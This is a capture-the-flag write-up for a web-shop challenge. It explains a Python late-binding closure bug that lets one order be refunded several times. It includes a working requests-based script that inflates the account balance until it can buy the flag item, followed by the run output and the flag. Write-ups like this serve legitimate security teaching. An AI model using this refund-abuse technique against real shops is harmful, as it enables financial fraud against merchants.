**Author: Zukane**

*It appears that PHP was not the solution after all, so we switched to the much more modern and secure Python language. Fortunatly, using modern frameworks also guarantees that our application is fully secure!*

##### Challenge overview

In this web challenge, we are given the website's source code and a URL to connect to.

On the site, we can register a user and login. We are met with a web-shop where we can buy sick stuff, such as the EPT Fidget Toy. Unfortunately, we only have a balance of $100.00. The only item in the store we can afford is the "Fun" item costing $99.99. We can buy an item, and we can refund it on our orders page if we have changed our mind. 

Analysing the source code, we can see this is where our balance is updated:

```python
def stream_sell_orders(session: Session, orders: list[Order]):
    for order in orders:

        def sell_order(user: User):
            if not order or order.user_id != user.id:
                return False
            item = session.get(Item, order.item_id)
            user.balance += item.price
            session.delete(order)
            session.commit()
            return True

        yield sell_order
```

This function is pretty weird. `stream_sell_orders` takes in a list of orders, and creates a function for each one to "sell" it. This function, `sell_order`, is created inside a for loop, and each time the loop runs, `sell_order` is supposed to reference a different order. Each `sell_order` function doesn’t actually "lock in" the specific order it was created for. Instead, all `sell_order` functions end up pointing to the **same variable** `order` because `order` is defined in the scope of `stream_sell_orders`. By the time any of the `sell_order` functions are called, `order` has already looped to the **last item** in the list, so all `sell_order` functions refer to that last item. This means the same order is refunded multiple times, inflating the user's balance

##### Solution

We can send in multiple orders. During the competition our team had made multiple accounts with orders, allowing me to batch the inflation faster. In reality, you just need at least two users. Make sure the final `order_id` corresponds to the correct user.

```python
import requests, time
from bs4 import BeautifulSoup

base_url = 'https://munintrollet-a43f-shop-5.ept.gg/'
cookies = {'token': 'd1e2b78b6fd0c4d7e8b6b6d30906c1e1'}

def buy_item(item_id=1):
    requests.post(base_url, cookies=cookies, data={"item_id": str(item_id)})

def sell_item():
    data = [('order_ids', '1'),('order_ids', '2'),('order_ids', '3'),('order_ids', '4'),('order_ids', '5'), ('order_ids', '7')]
    requests.post(base_url + 'orders', cookies=cookies, data=data)

def get_balance():
    r = requests.get(base_url, cookies=cookies)
    soup = BeautifulSoup(r.text, 'html.parser')
    span = soup.find('span', string=lambda x: x and x.startswith('Balance:'))
    if span:
        balance_str = span.text.split('$')[-1].replace(',', '')
        return float(balance_str)
    return 0.0

def get_flag():
    r = requests.get(base_url + 'orders', cookies=cookies)
    soup = BeautifulSoup(r.text, 'html.parser')
    for td in soup.find_all('td'):
        if 'EPT{' in td.text:
            print('Flag:', td.text.strip())
            return

while get_balance() < 2500:
    buy_item()
    sell_item()
    balance = get_balance()
    print(f"Balance: ${balance:.2f}")
    if balance >= 2500:
        buy_item(2)
        time.sleep(1)
        get_flag()
        break
    time.sleep(0.1)
```

By running this script, we can get the flag

```
└─$ python3 solve.py
Balance: $599.95
Balance: $1099.90
Balance: $1599.85
Balance: $2099.80
Balance: $2599.75
Flag: Come over to the admin booth and claim your very own EPT Fidget Toy for you and your team! EPT{G0in6_1n_l0ops_to0_f45t_m4k3s_m3_d1zzy}
```

`EPT{G0in6_1n_l0ops_to0_f45t_m4k3s_m3_d1zzy}`